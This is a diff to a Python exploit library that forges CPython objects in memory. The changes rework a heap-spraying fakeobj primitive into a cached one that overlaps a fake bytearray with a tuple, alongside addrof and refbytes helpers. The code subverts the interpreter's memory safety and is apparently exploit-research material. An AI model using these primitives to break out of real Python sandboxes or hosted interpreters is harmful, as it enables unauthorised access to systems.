@@ -26,7 +26,7 @@ if IS_PY2:
 			return "\0" * arr
 		return "".join(map(chr, arr)) # ewwww
 
-nogc = set()  # things we want to keep a reference to, to prevent gc
+nogc = []  # things we want to keep a reference to, to prevent gc
 
 
 def p64a(*n):
@@ -49,7 +49,7 @@ def addrof(obj):
 
 def refbytes(data):
 	# get the address of the internal buffer of a bytes object
-	nogc.add(data) # unnecessary?
+	nogc.append(data) # unnecessary?
 	return addrof(data) + BYTES_HEADER_LEN
 
 
@@ -107,17 +107,17 @@ def replace_code_consts(codeobj, consts):
 	return CodeType(*code_args)
 
 
-def fakeobj(addr):
+def fakeobj_once(addr):
 	fake_bytearray_ptr = bytes(p64a(addr))
 
 	if IS_PY2: # pad to 8-byte multiple
 		fake_bytearray_ptr = b"AAAA" + fake_bytearray_ptr
 
-	nogc.add(fake_bytearray_ptr)  # if this bytearray gets freed, bad things might happen
+	nogc.append(fake_bytearray_ptr)  # if this bytearray gets freed, bad things might happen
 
 	const_tuple, fake_bytearray_ref = get_aligned_tuple_and_bytes(fake_bytearray_ptr)
 
-	nogc.add(fake_bytearray_ref)  # likewise
+	nogc.append(fake_bytearray_ref)  # likewise
 
 	const_tuple_array_start = addrof(const_tuple) + TUPLE_HEADER_LEN
 	fake_bytearray_ref_addr = refbytes(fake_bytearray_ref)
@@ -137,6 +137,34 @@ def fakeobj(addr):
 	magic = makemagic()
 	return magic
 
+reusable_tuple = (None,)
+reusable_bytesarray = None
+def fakeobj(addr):
+	"""
+	fakeobj_once() does a heap spray each time, which may fail probabilistically and/or OOM.
+	so, we use it once to set up a more repeatable fakeobj primitive (via overlapping bytesarray and tuple)
+	which we can cache and reuse for future fakeobj() invocations.
+	"""
+
+	global reusable_bytesarray
+	if reusable_bytesarray is None:
+		fake_bytearray = bytes(p64a(
+			1,
+			addrof(bytearray),
+			sizeof(reusable_tuple),
+			sizeof(reusable_tuple),
+			addrof(reusable_tuple),
+			addrof(reusable_tuple),
+			0
+		))
+		reusable_bytesarray = fakeobj_once(refbytes(fake_bytearray))
+
+	# assume 64-bit ptrs
+	reusable_bytesarray[TUPLE_HEADER_LEN:TUPLE_HEADER_LEN+8] = p64a(addr)
+
+	res = reusable_tuple[0]
+	nogc.append(res) # unnecessary?
+	return res
 
 mem = None # cache the result
 def getmem():
